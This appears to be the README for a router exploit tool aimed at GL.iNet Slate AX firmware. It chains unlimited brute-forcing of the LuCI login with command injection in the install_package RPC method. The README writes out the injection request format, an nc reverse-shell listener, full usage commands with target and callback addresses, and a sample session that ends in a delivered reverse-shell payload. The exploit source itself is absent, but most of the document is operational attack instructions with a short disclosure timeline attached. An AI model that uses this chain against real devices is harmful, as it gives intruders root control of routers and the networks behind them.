# GL.iNet Router Exploit Chain

**Authentication Bypass + Authenticated Remote Code Execution**

| Field | Details |
|-------|---------|
| **Vendor** | GL.iNet |
| **Product** | GL-AXT1800 (Slate AX) |
| **Firmware** | 4.2.0, 4.6.4, 4.6.8 |
| **Author** | Aleksa Zatezalo |
| **Date** | November 2025 |

---

## CVE-XXXX-XXXXX: Authentication Bypass via Unrestricted Brute-Force

### Description

The LuCI web interface on GL.iNet routers lacks rate limiting or account lockout mechanisms on the authentication endpoint (`/cgi-bin/luci`). An unauthenticated attacker on the local network can perform unlimited password attempts against the admin interface.

### Impact

- **CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** (estimated)
- Credential disclosure via brute-force
- Full administrative access to router
- Enables chaining with authenticated vulnerabilities

### Technical Details

The LuCI interface accepts POST requests to `/cgi-bin/luci` with `luci_username` and `luci_password` parameters. Successful authentication returns HTTP 302; failure returns HTTP 403. No throttling, CAPTCHA, or lockout is implemented.

```
POST /cgi-bin/luci HTTP/1.1
Content-Type: application/x-www-form-urlencoded

luci_username=root&luci_password=<attempt>
```

---

## CVE-XXXX-XXXXX: Authenticated Command Injection in Plugin Handler

### Description

The GL.iNet RPC API contains a command injection vulnerability in the plugin installation handler. An authenticated attacker can inject arbitrary shell commands via the `name` parameter of the `install_package` method, achieving remote code execution as root.

### Impact

- **CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H** (estimated)
- Remote code execution as root
- Full device compromise
- Lateral movement into connected networks

### Technical Details

The vulnerable RPC method `plugins.install_package` passes the `name` parameter unsanitized to a shell command. Backtick or `$()` injection achieves arbitrary command execution.

```json
POST /rpc HTTP/1.1
Content-Type: application/json
Cookie: Admin-Token=<session_id>

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "call",
  "params": ["<sid>", "plugins", "install_package", {"name": ["`<payload>`"]}]
}
```

---

## Installation

```bash
pip install aiohttp requests passlib
```

---

## Usage

### Full Exploit Chain (Brute-Force → RCE)

```bash
# Start listener
nc -lvnp 4444

# Run exploit with wordlist
python glinet_pwn.py --rhost 192.168.8.1 --lhost 10.0.0.5 --lport 4444 -w wordlist.txt
```

### With Known Password

```bash
python glinet_pwn.py --rhost 192.168.8.1 --lhost 10.0.0.5 --lport 4444 -p admin123
```

### Brute-Force Only

```bash
python glinet_pwn.py --rhost 192.168.8.1 -w wordlist.txt --brute-only
```

### Options

```
Target:
  --rhost IP            Router IP address
  -u, --username USER   Username (default: root)

Authentication:
  -p, --password PASS   Known password (skip brute-force)
  -w, --wordlist FILE   Password wordlist for brute-force

Exploitation:
  --lhost IP            Listener IP for reverse shell
  --lport PORT          Listener port for reverse shell

Options:
  -c, --concurrency N   Concurrent brute-force requests (default: 10)
  --brute-only          Only perform brute-force (no RCE)
```

---

## Example Session

```
$ python glinet_pwn.py --rhost 192.168.8.1 --lhost 10.0.0.5 --lport 4444 -w passwords.txt

============================================================
GL.iNet Exploit Chain
============================================================

[*] Stage 1: Brute-Force Attack
[*] Target: 192.168.8.1
[*] Loaded 1000 passwords
[*] Brute forcing passwords
[+] Password found: router123

[*] Stage 2: Authentication
[*] Authenticating as root...
[+] Session obtained

[*] Stage 3: Command Injection
[*] Reverse shell -> 10.0.0.5:4444
[+] Payload delivered - check listener

============================================================
[+] Exploitation complete
============================================================
```

---

## Code Structure

```
glinet_pwn.py
│
├── Transport Layer
│   ├── build_rpc_request()     # JSON-RPC 2.0 payload builder
│   └── send_rpc()              # HTTP transport
│
├── Authentication Module
│   ├── get_challenge()         # Request auth challenge
│   ├── compute_auth_hash()     # GL.iNet hash algorithm
│   └── authenticate()          # Full auth flow
│
├── Brute-Force Module
│   ├── try_password()          # Single async attempt
│   ├── brute_force_async()     # Concurrent attack engine
│   ├── brute_force()           # Sync wrapper
│   └── load_wordlist()         # File loader
│
├── Exploitation Module
│   ├── build_reverse_shell_payload()
│   └── send_exploit()          # Command injection
│
├── Orchestration
│   ├── run_brute_force()       # Stage 1
│   ├── run_authentication()    # Stage 2
│   ├── run_exploit()           # Stage 3
│   └── run_full_chain()        # Complete chain
│
└── CLI
    ├── validate_*()            # Argument validators
    ├── build_parser()          # Argparse setup
    └── main()                  # Entry point
```

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-11-16 | Vulnerabilities discovered |
| 2025-11-24 | Vendor contacted via security@gl-inet.com |
| 2025-11-24 | Vendor acknowledged receipt |
| 2025-XX-XX | CVE IDs assigned |
| 2025-XX-XX | Public disclosure |

---

## References

- [GL.iNet Security Advisories](https://www.gl-inet.com/security/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

## Disclaimer

This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse of this software.

---
